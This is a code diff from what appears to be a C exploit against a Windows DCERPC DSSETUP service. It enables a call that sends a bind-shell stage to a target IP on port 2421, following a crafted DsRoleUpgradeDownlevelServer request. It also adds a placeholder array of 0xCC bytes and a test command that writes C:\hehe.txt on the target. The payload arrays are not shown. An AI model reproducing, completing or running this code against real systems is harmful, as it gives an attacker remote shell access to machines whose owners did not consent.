@@ -62,7 +62,7 @@ int main()
 	SendPacket(sock, (char*)DCERPC_BIND_REQUEST_PACKET, sizeof(DCERPC_BIND_REQUEST_PACKET));
 	SendPacket(sock, (char*)DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_BINDSHELL, sizeof(DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_BINDSHELL));
 
-	//SendBindshellCommand(targetIP, 2421);
+	SendBindshellCommand(targetIP, 2421);
 
 
 	closesocket(sock);
@@ -126,14 +126,13 @@ void SendBindshellCommand(const char* targetIP, int targetPort)
 		return;
 	}
 
-
-
-
 	const char* command = "echo hehe > C:\\hehe.txt";
 
+	const BYTE shellCommand[] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC };
 
-	//SendPacket(sock, (char*)bindshell_stage, sizeof(bindshell_stage));
-	//SendPacket(sock, (char*)command, strlen(command));
+
+	SendPacket(sock, (char*)packetBeforeStage, sizeof(packetBeforeStage));
+	SendPacket(sock, (char*)bindshellStage, sizeof(bindshellStage));
 
 
 
